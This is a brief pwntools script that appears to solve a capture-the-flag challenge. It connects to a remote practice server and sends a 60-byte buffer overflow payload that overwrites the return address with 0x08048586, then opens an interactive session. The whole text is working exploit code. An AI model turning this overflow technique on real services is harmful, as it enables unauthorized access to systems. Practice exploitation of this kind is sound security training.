from pwn import *

process = remote("thekidofarcrania.com", 4902)
process.recv()

process.sendline(b"\41"*60 + p32(0x08048586))

process.interactive()

